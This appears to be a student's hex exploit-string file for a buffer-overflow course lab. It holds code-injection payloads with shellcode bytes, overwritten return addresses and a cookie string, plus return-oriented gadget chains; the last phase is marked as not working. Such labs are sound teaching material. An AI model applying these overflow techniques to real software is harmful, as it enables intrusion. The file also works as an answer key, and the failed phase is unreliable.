/* phase 1 */

cc cc cc cc cc cc cc cc
cc cc cc cc cc cc cc cc
cc cc cc cc cc cc cc cc
cc cc cc cc cc cc cc cc
cc cc cc cc cc cc cc cc
cc cc cc cc cc cc cc cc
cc cc cc cc cc cc cc cc
d4 17 40 00 00 00 00





/* phase 2 */
48 c7 c7 30 51 c1 40 c3 /* disassembled program */        
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c8 3b 61 55 00 00 00 00 /* address of rsp */
00 18 40 00 00 00 00 00 /* touch 2 address */






 /* phase 3*/
48 c7 c7 10 3c 61 55 c3 /* binary of disassembled code */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c8 3b 61 55 00 00 00 00 /* address of rsp */ 
d4 18 40 00 00 00 00 00 /* address of touch3 */
34 30 63 31 35 31 33 30








 /* phase 4 */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
80 19 40 00 00 00 00 00
30 51 c1 40 00 00 00 00
8b 19 40 00 00 00 00 00
00 18 40 00 00 00 00 00 











 /* phase 5 (didn't work) */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
73 1a 40 00 00 00 00 00
63 19 40 00 00 00 00 00
80 19 40 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
d1 19 40 00 00 00 00 00
f3 19 40 00 00 00 00 00
9d 19 40 00 00 00 00 00
63 19 40 00 00 00 00 00
d4 18 40 00 00 00 00 00
34 30 63 31 35 31 33 30